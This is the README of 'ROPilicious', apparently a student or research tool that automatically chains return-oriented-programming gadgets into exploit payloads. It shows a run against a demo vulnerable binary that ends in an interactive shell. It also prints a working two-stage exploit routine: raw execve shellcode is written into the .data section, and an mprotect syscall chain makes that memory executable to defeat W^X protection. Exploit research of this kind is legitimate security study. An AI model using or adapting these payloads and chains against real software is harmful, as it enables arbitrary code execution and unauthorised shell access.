# ROPilicious

This repository has the sourcecode of our ROP tool. 

## How to use it?

Usage:
```
    $ python3 main.py --file FILE --length LEN --exploitType EXPLOITTYPE
```

## 1. How to generate an exploit using ROPilicious?

These are the exploits currently available: 

1. **execve**: execve() ROP Shellcode - will spawn a shell on success
2. **mprotect**: mprotect() ROP Shellcode + execve() traditional Shellcode - will spawn a shell on success

Once you run our tool with correct arguments, a **python script** with the required payload will be generated. 

Let us run it for the executable **bof** present in the repository. 

```
    $ python3 main.py --file bof --length 5 --exploitType execve
    Searching all executable sections....
    Searching the .init section
    2
    Found 2 gadgets

    Searching the .plt section
    2
    Found 2 gadgets

    Searching the .text section
    2
    Found 6387 gadgets

    Searching the __libc_freeres_fn section
    2
    Found 6449 gadgets

    Searching the __libc_thread_freeres_fn section
    2
    Found 6454 gadgets

    Searching the .fini section
    2
    Found 6456 gadgets



    -->Chaining to get a shell using execve system call
    -->Written the complete payload in execveROPChain.py
    -->Chaining successful!
```    

The python script generated is **execveROPChain.py**. 

1. Use **gdb** or any tool you are comfortable with and find out the amount of **junk** to put before the actual payload. In this example, the amount of junk is 120 bytes. Open up **execveROPChain.py** and do the following: 

```
    # Enter the amount of junk required
    payload = ''
```

Change it to this: 
```
    # Enter the amount of junk required
    payload = 'a' * 120
```

Now, you are set. 

2. Save and close the script. 

3. Run the script. It will dump the payload to be injected into **bof** in a file **payload.txt**. 

```
    $ python2 execveROPChain.py
    $ ls -l payload.txt
    -rw-rw-r-- 1 adwi adwi 696 Mar 21 19:01 payload.txt
```

4. Run the executable and inject the payload. 

```
    $ cat payload.txt - | ./bof
    Before function call

    whoami
    adwi

    who
    adwi     tty7         Mar 18 13:09 (:0)
    uname 
    Linux
    ^C
```

And that is how its done!

## 2. Can you write your own exploits using ROPilicious?

Yes. Absolutely. The tool provides routines which generates payload to load a value into a register, to write stuff(say shellcode) you want into particular memory location etc., 

Consider the script **mprotectChain.py** - which is a proof-of-concept of the famous 2-stage exploit. 

Objective: To be able to execute **traditional shellcode** on a system guarded with **W^X**. 

This is how it's done. The exploit is divided into 2 stages. 

1. Use ROP Payload and do the 2 tasks: 
    
    * To **write** the traditional shellcode you want to execute. 
    * To execute ```mprotect()``` on ```.data section``` and make it an executable section. 

2. Jump to ```.data section``` and execute traditional shellcode(assuming mprotect was a success). 

All this can be done in around 50 lines of python code. The following is the **crux** of the exploit. You can open up **mprotectChain.py** for complete working exploit. 

The following routine gives a python script **mprotectROPChain.py** which you can run in a way similar to above shown example. 

```python

def case2(GadgetList, data_section_addr) : 

    # Open the file where the payload is written in the form of a python script
    fd = open("mprotectROPChain.py", "w")
    chain.writeHeader(fd)
    
    # Step-2: Writing traditional shellcode into .data section
    shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    
    # Write shellcode into .data section
    chain.WriteStuffIntoMemory(shellcode, data_section_addr, fd)
    
    # System call number of mprotect = 10
    # Step-1: rax <- 10
    chain.LoadConstIntoReg(GadgetList, "rax", 10, fd)

	# Step-3: rdi <- Starting address of writable section. 
   
    # 0x6c9000 is where Writable section starts.
    chain.LoadConstIntoReg(GadgetList, "rdi", 0x6c9000, fd)
	
    # Step-4: rsi <- 100
    # Make the first 4096 * 3 bytes of Writable section executable.
    # .data section comes at an address 0x6ca980
    chain.LoadConstIntoReg(GadgetList, "rsi", 4096 * 3, fd)

    # Step-5: rdx <- 7
    # 7 - PROT_READ | PROT_WRITE | PROT_EXEC
    # The permissions to execute!
    chain.LoadConstIntoReg(GadgetList, "rdx", 7, fd)

    # At this point, .data section is executable

    # Get "syscall; ret"
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    syscallGadget = syscallList[0]
    
    syscallDict = syscallGadget[0]
    syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")

    # The "ret" of "syscall; ret" should jump to .data section
    # That is why, put .data section's address onto stack@
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(data_section_addr))
    fd.write(")")
    fd.write("\t\t# Address of .data section where shellcode is present")
    fd.write("\n\t")
    
    chain.writeFooter(fd)
    print("-->Written the complete payload in mprotectROPChain.py")
    print("-->Chaining successful!")
```

## 3. How good is this tool?

These are the features of our tool. 

1. Completely automated ROP payload generation. 

2. Scriptable to certain extent. You can build exploits similar to that mentioned in (2) very easily. 

    * (2) demonstrated a 2-stage exploit - ROP + traditional. You can build such exploits with ease. You can combine different exploit methods with ease. 

3. Our tool does not make any assumptions on the vulnerable executable. But we expect the vulnerable executable to be big enough so that our tool can find the required gadgets. 

4. As ```system calls``` are heavy lifting functions, our tool focusses on chaining gadgets to execute system calls. Because with system calls, any type of exploit can be crafted.


## 4. How can we improve the tool?

The following are the short-comings of the tool. 

1. ROPilicious uses gadgets of the type ```Inst; ret```, classifies them based on what **Inst** instruction does and then chaining particular gadgets to get the exploit ready. It is now using very limited number of gadgets. It would be great if we are able to use complicated gadgets so that we can build better exploits and the same exploits with lesser number of gadgets - which is quite important. 

2. The tool is using Simple Syntactic Searching. We can make the tool better by making Syntactic Search more rigorous and / or Semantically searching for gadgets using Solvers, Symbolic Execution. 